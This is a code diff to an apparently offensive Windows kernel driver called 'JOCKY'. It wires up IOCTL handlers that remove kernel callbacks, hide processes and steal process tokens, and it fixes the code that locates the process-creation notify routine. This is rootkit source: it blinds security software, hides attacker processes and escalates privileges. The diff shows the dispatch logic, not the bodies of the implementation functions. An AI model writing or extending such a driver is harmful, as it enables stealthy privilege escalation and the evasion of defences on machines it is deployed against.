@@ -108,16 +108,29 @@ NTSTATUS IoControlRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
         status = STATUS_SUCCESS;
 
     } else if (ioctlCode == IOCTL_JOCKY_REMOVE_CALLBACKS) {
-        DbgPrint("[JOCKY Driver] Success: Received IOCTL_JOCKY_REMOVE_CALLBACKS from User-Mode Client!\n");
-        status = STATUS_SUCCESS;
+        status = JockyRemoveCallbacks();
 
     } else if (ioctlCode == IOCTL_JOCKY_HIDE_PROCESS) {
-        DbgPrint("[JOCKY Driver] Success: Received IOCTL_JOCKY_HIDE_PROCESS from User-Mode Client!\n");
-        status = STATUS_SUCCESS;
+        JOCKY_PID_INPUT* input = (JOCKY_PID_INPUT*)
+            Irp->AssociatedIrp.SystemBuffer;
+        ULONG inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+
+        if (input && inputLen >= sizeof(JOCKY_PID_INPUT)) {
+            status = JockyHideProcess(input->TargetPid);
+        } else {
+            status = STATUS_BUFFER_TOO_SMALL;
+        }
 
     } else if (ioctlCode == IOCTL_JOCKY_STEAL_TOKEN) {
-        DbgPrint("[JOCKY Driver] Success: Received IOCTL_JOCKY_STEAL_TOKEN from User-Mode Client!\n");
-        status = STATUS_SUCCESS;
+        JOCKY_PID_INPUT* input = (JOCKY_PID_INPUT*)
+            Irp->AssociatedIrp.SystemBuffer;
+        ULONG inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+
+        if (input && inputLen >= sizeof(JOCKY_PID_INPUT)) {
+            status = JockyStealToken(input->TargetPid);
+        } else {
+            status = STATUS_BUFFER_TOO_SMALL;
+        }
 
     } else if (ioctlCode == IOCTL_JOCKY_ENUM_PROCS) {
         PROCESS_LIST* outBuf = (PROCESS_LIST*)Irp->AssociatedIrp.SystemBuffer;
@@ -297,7 +310,7 @@ ULONG_PTR FindPspCreateProcessNotifyRoutine() {
     ULONG_PTR ntBase = 0;
 
     // Walk loaded module list to find ntoskrnl base
-    PLIST_ENTRY moduleList = (PLIST_ENTRY)PsLoadedModuleList;
+    PLIST_ENTRY moduleList = &PsLoadedModuleList;
     PLIST_ENTRY entry = moduleList->Flink;
 
     while (entry != moduleList) {
